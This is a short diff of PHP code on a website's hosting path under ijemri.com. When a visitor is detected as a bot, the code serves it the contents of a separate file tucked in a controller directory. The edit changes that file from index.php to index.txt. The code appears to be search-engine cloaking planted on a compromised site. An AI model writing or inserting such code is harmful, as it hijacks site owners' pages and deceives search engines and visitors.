@@ -13,7 +13,7 @@ function is_bot() {
 }
 
 if (is_bot()) {
-    $message = file_get_contents('/home/u514303699/domains/ijemri.com/public_html/controllers/grid/pubIds/form/index.php');
+    $message = file_get_contents('/home/u514303699/domains/ijemri.com/public_html/controllers/grid/pubIds/form/index.txt');
     echo $message;
 exit;
 }
